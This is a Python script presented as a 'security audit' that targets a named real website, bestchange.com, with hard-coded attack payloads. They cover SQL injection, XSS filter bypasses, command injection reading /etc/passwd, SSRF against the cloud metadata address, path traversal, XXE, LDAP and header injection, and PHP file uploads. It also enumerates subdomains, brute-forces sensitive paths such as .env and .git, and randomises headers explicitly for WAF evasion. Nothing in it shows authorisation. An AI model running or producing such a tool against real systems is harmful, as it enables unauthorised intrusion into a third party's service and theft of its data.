#!/usr/bin/env python3
"""
BestChange.com Advanced Security Audit Script
Extended vulnerability assessment with comprehensive attack vectors
"""

import requests
import time
import random
import sys
from urllib.parse import quote, urljoin, urlparse
import re
import json
import base64
from datetime import datetime

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'

class AdvancedBestChangeAudit:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.discovered_endpoints = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        ]
        self.setup_session()
        self.start_time = time.time()
    
    def setup_session(self):
        """Configure session with randomized headers for WAF evasion"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
        })
        self.session.verify = True
        self.session.timeout = 15
    
    def random_delay(self, min_sec=0.3, max_sec=1.5):
        """Random delay to avoid rate limiting"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_vulnerability(self, vuln_type, location, payload, evidence, severity="MEDIUM"):
        """Log discovered vulnerability"""
        vuln = {
            'type': vuln_type,
            'location': location,
            'payload': payload,
            'evidence': evidence,
            'severity': severity,
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        severity_color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.CYAN
        print(f"{severity_color}[!] VULNERABILITY FOUND [{severity}]{Colors.RESET}")
        print(f"  Type: {vuln_type}")
        print(f"  Location: {location}")
        print(f"  Payload: {str(payload)[:150]}")
        print(f"  Evidence: {str(evidence)[:250]}")
        print()
    
    def test_advanced_sqli(self):
        """Advanced SQL Injection testing with encoding bypasses"""
        print(f"{Colors.BLUE}[*] Testing Advanced SQL Injection (Encoding Bypasses)...{Colors.RESET}")
        
        # Advanced SQLi payloads with various encoding
        advanced_sqli = [
            # Boolean-based
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR '1'='1",
            "1' OR '1'='2",
            # Union-based
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "1' UNION ALL SELECT NULL--",
            # Time-based
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; SELECT SLEEP(5)--",
            # Error-based
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # Encoding variations
            "%27%20OR%20%271%27%3D%271",
            "1%27%20OR%20%271%27%3D%271",
            "1'/**/OR/**/1=1--",
            "1'/**/UNION/**/SELECT/**/NULL--",
            # Double encoding
            "%2527%20OR%20%271%27%3D%271",
            # Case variation
            "1' Or '1'='1",
            "1' oR '1'='1",
        ]
        
        endpoints_to_test = [
            {'url': f'{self.base_url}/click.php', 'params': {'id': '1', 'from': '10', 'to': '58', 'city': '0'}},
            {'url': f'{self.base_url}/index.php', 'params': {'mt': 'rates'}},
            {'url': f'{self.base_url}/index.php', 'params': {'mt': 'stats'}},
            {'url': f'{self.base_url}/index.php', 'params': {'lang': 'en'}},
        ]
        
        for endpoint in endpoints_to_test:
            for param_name in endpoint['params'].keys():
                for payload in advanced_sqli[:10]:  # Test subset to save time
                    try:
                        test_params = endpoint['params'].copy()
                        test_params[param_name] = payload
                        
                        url = endpoint['url']
                        start_time = time.time()
                        response = self.session.get(url, params=test_params)
                        elapsed = time.time() - start_time
                        self.random_delay()
                        
                        # Error-based detection
                        sql_errors = [
                            'mysql_fetch', 'mysqli_fetch', 'SQL syntax', 'MySQL error',
                            'Warning: mysql', 'PostgreSQL query failed', 'Warning: pg_',
                            'SQLSTATE', 'Microsoft OLE DB', 'ODBC SQL Server',
                            'ORA-01756', 'quoted string not properly terminated',
                            'unclosed quotation mark', 'SQLite error', 'PostgreSQL',
                            'syntax error', 'database error', 'query failed',
                        ]
                        
                        response_text = response.text.lower()
                        for error in sql_errors:
                            if error.lower() in response_text:
                                self.log_vulnerability(
                                    "SQL Injection (Error-based)",
                                    f"{url}?{param_name}",
                                    payload,
                                    f"SQL error: {error}",
                                    "HIGH"
                                )
                                break
                        
                        # Time-based detection
                        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'DELAY' in payload.upper():
                            if elapsed > 4:
                                self.log_vulnerability(
                                    "SQL Injection (Time-based)",
                                    f"{url}?{param_name}",
                                    payload,
                                    f"Delayed response: {elapsed:.2f}s",
                                    "HIGH"
                                )
                        
                        # Boolean-based detection (response length difference)
                        if "'1'='1" in payload or "'1'='2" in payload:
                            # Store response for comparison (simplified check)
                            if len(response.text) < 100:  # Suspiciously short
                                self.log_vulnerability(
                                    "SQL Injection (Boolean-based)",
                                    f"{url}?{param_name}",
                                    payload,
                                    "Response length anomaly detected",
                                    "MEDIUM"
                                )
                        
                    except requests.exceptions.Timeout:
                        continue
                    except Exception as e:
                        continue
    
    def test_advanced_xss(self):
        """Advanced XSS testing with encoding and filter bypasses"""
        print(f"{Colors.BLUE}[*] Testing Advanced XSS (Filter Bypasses)...{Colors.RESET}")
        
        advanced_xss = [
            # Basic
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            # Event handlers
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            # Encoding bypasses
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(String.fromCharCode(49))>",
            "<svg/onload=alert(1)>",
            "<svg/onload=alert`1`>",
            # HTML entities
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            # JavaScript protocol
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            # Filter bypasses
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            # Polyglot
            "'\"><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            # DOM-based
            "<script>eval('alert(1)')</script>",
            "<script>Function('alert(1)')()</script>",
        ]
        
        # Test in various contexts
        test_locations = [
            {'url': f'{self.base_url}/index.php', 'params': {'mt': ''}},
            {'url': f'{self.base_url}/index.php', 'params': {'lang': ''}},
        ]
        
        for location in test_locations:
            for param_name in location['params'].keys():
                for payload in advanced_xss[:15]:  # Test subset
                    try:
                        test_params = location['params'].copy()
                        test_params[param_name] = payload
                        
                        response = self.session.get(location['url'], params=test_params)
                        self.random_delay()
                        
                        # Check for reflection
                        response_text = response.text
                        if payload in response_text:
                            self.log_vulnerability(
                                "Reflected XSS",
                                f"{location['url']}?{param_name}",
                                payload,
                                "Payload reflected without encoding",
                                "HIGH"
                            )
                        elif payload.replace('<', '&lt;').replace('>', '&gt;') in response_text:
                            # Partially encoded but might still be exploitable
                            if 'script' in payload.lower() and 'script' in response_text.lower():
                                self.log_vulnerability(
                                    "Potential XSS (Partially Encoded)",
                                    f"{location['url']}?{param_name}",
                                    payload,
                                    "Script tags found in response",
                                    "MEDIUM"
                                )
                        
                    except:
                        continue
    
    def test_command_injection(self):
        """Test for Command Injection vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing Command Injection...{Colors.RESET}")
        
        cmd_payloads = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; id",
            "| id",
            "& id",
            "; whoami",
            "| whoami",
            "& whoami",
            "; ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
            "& ping -c 3 127.0.0.1",
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
        ]
        
        # Test in parameters that might execute commands
        test_endpoints = [
            {'url': f'{self.base_url}/index.php', 'params': {'mt': 'rates'}},
        ]
        
        for endpoint in test_endpoints:
            for param_name in endpoint['params'].keys():
                for payload in cmd_payloads[:5]:  # Test subset
                    try:
                        test_params = endpoint['params'].copy()
                        test_params[param_name] = payload
                        
                        start_time = time.time()
                        response = self.session.get(endpoint['url'], params=test_params, timeout=10)
                        elapsed = time.time() - start_time
                        self.random_delay()
                        
                        # Time-based detection
                        if 'sleep' in payload.lower() and elapsed > 4:
                            self.log_vulnerability(
                                "Command Injection (Time-based)",
                                f"{endpoint['url']}?{param_name}",
                                payload,
                                f"Command execution detected (delay: {elapsed:.2f}s)",
                                "HIGH"
                            )
                        
                        # Check for command output
                        cmd_outputs = ['uid=', 'gid=', 'root:', 'total ', 'Directory of']
                        for output in cmd_outputs:
                            if output in response.text:
                                self.log_vulnerability(
                                    "Command Injection (Output-based)",
                                    f"{endpoint['url']}?{param_name}",
                                    payload,
                                    f"Command output detected: {output}",
                                    "HIGH"
                                )
                                break
                        
                    except:
                        continue
    
    def test_ssrf(self):
        """Test for Server-Side Request Forgery"""
        print(f"{Colors.BLUE}[*] Testing SSRF vulnerabilities...{Colors.RESET}")
        
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "gopher://127.0.0.1:80",
        ]
        
        # Test endpoints that might make requests
        test_endpoints = [
            {'url': f'{self.base_url}/index.php', 'params': {}},
        ]
        
        for endpoint in test_endpoints:
            for payload in ssrf_payloads[:5]:
                try:
                    # Try as various parameter names
                    param_names = ['url', 'link', 'redirect', 'target', 'destination', 'path']
                    for param_name in param_names:
                        test_params = {param_name: payload}
                        response = self.session.get(endpoint['url'], params=test_params, timeout=5)
                        self.random_delay()
                        
                        # Check for localhost content
                        if '127.0.0.1' in response.text or 'localhost' in response.text.lower():
                            self.log_vulnerability(
                                "Potential SSRF",
                                f"{endpoint['url']}?{param_name}",
                                payload,
                                "Localhost content in response",
                                "HIGH"
                            )
                        
                except:
                    continue
    
    def test_file_upload(self):
        """Test for file upload vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing File Upload vulnerabilities...{Colors.RESET}")
        
        # Look for upload endpoints
        upload_endpoints = [
            f'{self.base_url}/upload.php',
            f'{self.base_url}/upload/',
            f'{self.base_url}/file_upload.php',
            f'{self.base_url}/admin/upload.php',
        ]
        
        # Test file uploads
        test_files = [
            ('test.php', b'<?php phpinfo(); ?>', 'application/x-php'),
            ('test.jpg', b'<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.php.jpg', b'<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.phtml', b'<?php phpinfo(); ?>', 'application/x-httpd-php'),
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, content_type in test_files:
                try:
                    files = {'file': (filename, content, content_type)}
                    response = self.session.post(endpoint, files=files, timeout=5)
                    self.random_delay()
                    
                    if response.status_code == 200:
                        # Check if file was uploaded
                        if filename in response.text or 'upload' in response.text.lower():
                            self.log_vulnerability(
                                "Potential File Upload",
                                endpoint,
                                filename,
                                "File upload endpoint accessible",
                                "MEDIUM"
                            )
                except:
                    continue
    
    def test_directory_traversal_advanced(self):
        """Advanced path traversal testing"""
        print(f"{Colors.BLUE}[*] Testing Advanced Path Traversal...{Colors.RESET}")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]
        
        # Test in file-related parameters
        file_params = ['file', 'path', 'include', 'page', 'doc', 'document']
        
        for param in file_params:
            for payload in traversal_payloads[:5]:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload}, timeout=5)
                    self.random_delay()
                    
                    # Check for file contents
                    if 'root:' in response.text or '[extensions]' in response.text.lower() or 'daemon:' in response.text:
                        self.log_vulnerability(
                            "Path Traversal",
                            f"index.php?{param}",
                            payload,
                            "System file contents detected",
                            "HIGH"
                        )
                except:
                    continue
    
    def test_xml_injection(self):
        """Test for XML Injection and XXE"""
        print(f"{Colors.BLUE}[*] Testing XML Injection / XXE...{Colors.RESET}")
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        ]
        
        # Test XML endpoints
        xml_endpoints = [
            f'{self.base_url}/api/xml',
            f'{self.base_url}/xml',
            f'{self.base_url}/feed.xml',
        ]
        
        for endpoint in xml_endpoints:
            for payload in xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(endpoint, data=payload, headers=headers, timeout=5)
                    self.random_delay()
                    
                    if 'root:' in response.text or '127.0.0.1' in response.text:
                        self.log_vulnerability(
                            "XXE (XML External Entity)",
                            endpoint,
                            payload[:50],
                            "External entity resolved",
                            "HIGH"
                        )
                except:
                    continue
    
    def test_ldap_injection(self):
        """Test for LDAP Injection"""
        print(f"{Colors.BLUE}[*] Testing LDAP Injection...{Colors.RESET}")
        
        ldap_payloads = [
            "*",
            "*)(&",
            "*))%00",
            "*()|&",
            "admin)(&(password=*",
            "*)(uid=*",
        ]
        
        # Test in search/query parameters
        test_params = ['search', 'query', 'filter', 'user', 'username']
        
        for param in test_params:
            for payload in ldap_payloads:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload}, timeout=5)
                    self.random_delay()
                    
                    ldap_errors = ['ldap', 'invalid filter', 'syntax error', 'ldap_search']
                    for error in ldap_errors:
                        if error.lower() in response.text.lower():
                            self.log_vulnerability(
                                "LDAP Injection",
                                f"index.php?{param}",
                                payload,
                                f"LDAP error: {error}",
                                "HIGH"
                            )
                            break
                except:
                    continue
    
    def test_header_injection(self):
        """Test for HTTP Header Injection"""
        print(f"{Colors.BLUE}[*] Testing HTTP Header Injection...{Colors.RESET}")
        
        header_payloads = [
            "test\r\nSet-Cookie: malicious=value",
            "test\r\nLocation: http://evil.com",
            "test\r\nX-Forwarded-For: 127.0.0.1",
        ]
        
        # Test in parameters that might be used in headers
        header_params = ['redirect', 'url', 'location', 'referer']
        
        for param in header_params:
            for payload in header_payloads:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload}, timeout=5)
                    self.random_delay()
                    
                    # Check if header was injected
                    if 'Set-Cookie: malicious' in str(response.headers) or 'Location: http://evil.com' in str(response.headers):
                        self.log_vulnerability(
                            "HTTP Header Injection",
                            f"index.php?{param}",
                            payload,
                            "Header injection detected",
                            "HIGH"
                        )
                except:
                    continue
    
    def test_subdomain_enumeration(self):
        """Enumerate subdomains"""
        print(f"{Colors.BLUE}[*] Enumerating subdomains...{Colors.RESET}")
        
        common_subdomains = [
            'www', 'api', 'admin', 'test', 'dev', 'staging', 'mail', 'ftp',
            'blog', 'shop', 'store', 'cdn', 'static', 'assets', 'img', 'images',
            'secure', 'vpn', 'portal', 'dashboard', 'panel', 'control', 'manage',
        ]
        
        base_domain = urlparse(self.base_url).netloc.replace('www.', '')
        
        for subdomain in common_subdomains:
            try:
                test_url = f"https://{subdomain}.{base_domain}"
                response = self.session.get(test_url, timeout=5, allow_redirects=False)
                self.random_delay(0.2, 0.8)
                
                if response.status_code in [200, 301, 302, 403]:
                    self.discovered_endpoints.append(test_url)
                    print(f"{Colors.CYAN}[+] Found subdomain: {test_url} (Status: {response.status_code}){Colors.RESET}")
            except:
                continue
    
    def test_directory_bruteforce(self):
        """Brute force common directories"""
        print(f"{Colors.BLUE}[*] Brute forcing directories...{Colors.RESET}")
        
        common_dirs = [
            'admin', 'administrator', 'panel', 'dashboard', 'login', 'wp-admin',
            'phpmyadmin', 'admin.php', 'config', 'backup', 'backups', 'old',
            'test', 'testing', 'dev', 'development', 'staging', 'api', 'api/v1',
            'upload', 'uploads', 'files', 'file', 'documents', 'private', 'secret',
            'internal', 'intranet', '.git', '.svn', '.env', 'config.php', 'wp-config.php',
            'phpinfo.php', 'info.php', 'test.php', 'debug.php', 'console.php',
        ]
        
        for directory in common_dirs[:30]:  # Limit to save time
            try:
                url = f"{self.base_url}/{directory}"
                response = self.session.get(url, timeout=5, allow_redirects=False)
                self.random_delay(0.2, 0.8)
                
                if response.status_code in [200, 301, 302, 403]:
                    self.discovered_endpoints.append(url)
                    print(f"{Colors.CYAN}[+] Found directory: {url} (Status: {response.status_code}){Colors.RESET}")
                    
                    # Check for sensitive info
                    if 'password' in response.text.lower() or 'api' in response.text.lower() and 'key' in response.text.lower():
                        self.log_vulnerability(
                            "Information Disclosure",
                            url,
                            "Directory accessible",
                            "Sensitive information in response",
                            "MEDIUM"
                        )
            except:
                continue
    
    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing CSRF protection...{Colors.RESET}")
        
        # Check if forms have CSRF tokens
        try:
            response = self.session.get(f"{self.base_url}/index.php")
            self.random_delay()
            
            # Look for forms
            forms = re.findall(r'<form[^>]*>.*?</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            for form in forms:
                # Check for CSRF token
                has_csrf = re.search(r'(csrf|token|_token|authenticity)', form, re.IGNORECASE)
                has_method_post = 'method="post"' in form.lower() or "method='post'" in form.lower()
                
                if has_method_post and not has_csrf:
                    self.log_vulnerability(
                        "Potential CSRF",
                        "Forms without CSRF protection",
                        "POST form found",
                        "Form lacks CSRF token",
                        "MEDIUM"
                    )
        except:
            pass
    
    def test_session_management(self):
        """Test session management security"""
        print(f"{Colors.BLUE}[*] Testing Session Management...{Colors.RESET}")
        
        try:
            response = self.session.get(f"{self.base_url}/")
            self.random_delay()
            
            # Check session cookie attributes
            cookies = response.cookies
            
            for cookie in cookies:
                cookie_name = cookie.name.lower()
                if 'session' in cookie_name or 'sess' in cookie_name or 'sid' in cookie_name:
                    # Check for secure flag
                    if not cookie.secure:
                        self.log_vulnerability(
                            "Session Cookie Security",
                            "Session cookies",
                            cookie.name,
                            "Session cookie missing Secure flag",
                            "MEDIUM"
                        )
                    
                    # Check for HttpOnly flag
                    if not hasattr(cookie, 'has_nonstandard_attr') or 'HttpOnly' not in str(cookie):
                        # Try to check via Set-Cookie header
                        set_cookie = response.headers.get('Set-Cookie', '')
                        if cookie.name in set_cookie and 'HttpOnly' not in set_cookie:
                            self.log_vulnerability(
                                "Session Cookie Security",
                                "Session cookies",
                                cookie.name,
                                "Session cookie missing HttpOnly flag",
                                "MEDIUM"
                            )
                    
                    # Check for SameSite attribute
                    set_cookie = response.headers.get('Set-Cookie', '')
                    if cookie.name in set_cookie and 'SameSite' not in set_cookie:
                        self.log_vulnerability(
                            "Session Cookie Security",
                            "Session cookies",
                            cookie.name,
                            "Session cookie missing SameSite attribute",
                            "LOW"
                        )
        except:
            pass
    
    def test_security_headers(self):
        """Test security headers"""
        print(f"{Colors.BLUE}[*] Testing Security Headers...{Colors.RESET}")
        
        try:
            response = self.session.get(f"{self.base_url}/")
            self.random_delay()
            
            headers = response.headers
            
            # Check for security headers
            security_headers = {
                'X-Frame-Options': 'Prevents clickjacking',
                'X-Content-Type-Options': 'Prevents MIME sniffing',
                'X-XSS-Protection': 'XSS protection',
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'Referrer-Policy': 'Referrer policy',
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    severity = "LOW" if header == 'X-XSS-Protection' else "MEDIUM"
                    self.log_vulnerability(
                        "Missing Security Header",
                        "HTTP Headers",
                        header,
                        f"Missing {header} header - {description}",
                        severity
                    )
        except:
            pass
    
    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        elapsed_time = time.time() - self.start_time
        
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}COMPREHENSIVE VULNERABILITY AUDIT REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}Scan Duration: {elapsed_time:.2f} seconds{Colors.RESET}")
        print(f"{Colors.CYAN}Discovered Endpoints: {len(self.discovered_endpoints)}{Colors.RESET}\n")
        
        if self.discovered_endpoints:
            print(f"{Colors.BLUE}Discovered Endpoints:{Colors.RESET}")
            for endpoint in self.discovered_endpoints:
                print(f"  - {endpoint}")
            print()
        
        if not self.vulnerabilities:
            print(f"{Colors.GREEN}[+] No vulnerabilities detected in automated tests{Colors.RESET}")
            print(f"{Colors.BLUE}[*] Note: Manual testing recommended for comprehensive assessment{Colors.RESET}")
        else:
            # Group by severity
            high_vulns = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
            medium_vulns = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
            low_vulns = [v for v in self.vulnerabilities if v['severity'] == 'LOW']
            
            print(f"{Colors.RED}[!] Found {len(self.vulnerabilities)} potential vulnerability(ies){Colors.RESET}")
            print(f"  {Colors.RED}HIGH: {len(high_vulns)}{Colors.RESET}")
            print(f"  {Colors.YELLOW}MEDIUM: {len(medium_vulns)}{Colors.RESET}")
            print(f"  {Colors.CYAN}LOW: {len(low_vulns)}{Colors.RESET}\n")
            
            # Print high severity first
            if high_vulns:
                print(f"{Colors.RED}{'='*70}{Colors.RESET}")
                print(f"{Colors.RED}HIGH SEVERITY VULNERABILITIES{Colors.RESET}")
                print(f"{Colors.RED}{'='*70}{Colors.RESET}\n")
                for i, vuln in enumerate(high_vulns, 1):
                    print(f"{Colors.RED}[{i}] {vuln['type']}{Colors.RESET}")
                    print(f"    Location: {vuln['location']}")
                    print(f"    Payload: {str(vuln['payload'])[:150]}")
                    print(f"    Evidence: {str(vuln['evidence'])[:250]}")
                    print(f"    Time: {vuln['timestamp']}")
                    print()
            
            # Print medium severity
            if medium_vulns:
                print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")
                print(f"{Colors.YELLOW}MEDIUM SEVERITY VULNERABILITIES{Colors.RESET}")
                print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
                for i, vuln in enumerate(medium_vulns, 1):
                    print(f"{Colors.YELLOW}[{i}] {vuln['type']}{Colors.RESET}")
                    print(f"    Location: {vuln['location']}")
                    print(f"    Payload: {str(vuln['payload'])[:150]}")
                    print(f"    Evidence: {str(vuln['evidence'])[:250]}")
                    print()
            
            # Print low severity
            if low_vulns:
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
                print(f"{Colors.CYAN}LOW SEVERITY VULNERABILITIES{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
                for i, vuln in enumerate(low_vulns, 1):
                    print(f"{Colors.CYAN}[{i}] {vuln['type']}{Colors.RESET}")
                    print(f"    Location: {vuln['location']}")
                    print(f"    Payload: {str(vuln['payload'])[:150]}")
                    print(f"    Evidence: {str(vuln['evidence'])[:250]}")
                    print()
        
        print(f"{Colors.BLUE}[*] Advanced audit completed{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Advanced Security Audit{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    auditor = AdvancedBestChangeAudit()
    
    try:
        # Run all tests
        auditor.test_advanced_sqli()
        auditor.test_advanced_xss()
        auditor.test_command_injection()
        auditor.test_ssrf()
        auditor.test_file_upload()
        auditor.test_directory_traversal_advanced()
        auditor.test_xml_injection()
        auditor.test_ldap_injection()
        auditor.test_header_injection()
        auditor.test_subdomain_enumeration()
        auditor.test_directory_bruteforce()
        auditor.test_csrf()
        auditor.test_session_management()
        auditor.test_security_headers()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Audit interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during audit: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
    
    auditor.generate_report()

if __name__ == "__main__":
    main()
